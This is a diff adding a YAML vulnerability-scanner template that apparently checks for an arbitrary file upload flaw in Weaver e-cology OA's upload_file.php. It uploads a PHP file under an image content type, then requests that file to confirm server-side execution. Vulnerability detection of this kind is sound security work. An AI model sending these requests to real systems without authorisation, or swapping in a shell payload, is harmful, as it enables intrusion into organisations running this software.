@@ -1,0 +1,30 @@
+id: poc-yaml-weaver-e-cology-uploadfile.php-arbitrary-file-upload
+info:
+  name: 泛微OA Ecology upload_file.php 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: e-cology
+  osprey-id: vb_2021_0029
+variables:
+  r_rand_name: random_str(5)
+requests:
+- method: POST
+  path: /Upload/upload_file.php?l=test
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/89.0.4389.90 Safari/537.36
+  files:
+    file:
+      filename: '{{.r_rand_name}}.php'
+      content: <?php echo ('31123124214'+'123123124');?>
+      content_type: image/avif
+  expression: 'status_code == 200 && contains(body, "{{.r_rand_name}}.php")
+
+    '
+- method: GET
+  path: /Upload/test/{{.r_rand_name}}.php
+  headers: {}
+  data: null
+  expression: contains(body, "31246247338")
+transport: http
